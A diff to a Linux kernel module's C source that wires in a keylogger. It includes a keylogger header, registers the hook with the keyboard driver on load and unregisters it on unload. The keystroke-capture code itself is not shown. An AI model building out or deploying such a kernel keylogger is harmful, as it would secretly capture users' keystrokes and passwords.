@@ -6,6 +6,7 @@
 #include <asm/uaccess.h>
 
 #include "definitions.h"
+#include "keylogger.h"
 
 #define CLASS_NAME "qlog"
 #define DEVICE_NAME "qlogc"
@@ -87,9 +88,25 @@ static int __init qlog_init(void) {
 
     // Success.
     LOG_INFO("Device %s registered successfully.\n", DEVICE_NAME);
+
+    // Register keylogger with the keyboard driver
+    retval = keylogger_register();
+    if (retval != 0) {
+        LOG_ERROR("Failed to register keylogger. Errno: %d\n", retval);
+        goto cleanup;
+    }
+    
+    LOG_INFO("Keylogger initialised.\n");
+
     return retval;
 
 cleanup:
+    // Clean up the device object
+    if (s_device) {
+        device_destroy(s_class, MKDEV(s_major, 0));
+        class_unregister(s_class);
+    }
+
     // Destroy the class
     if (s_class) {
         class_destroy(s_class); 
@@ -110,6 +127,9 @@ cleanup:
  */
 static void __exit qlog_exit(void) {
     LOG_INFO("Unloading device %s\n", DEVICE_NAME);
+    
+    // Unregister the key logger
+    keylogger_unregister();
 
     // Cleanup the device
     device_destroy(s_class, MKDEV(s_major, 0));
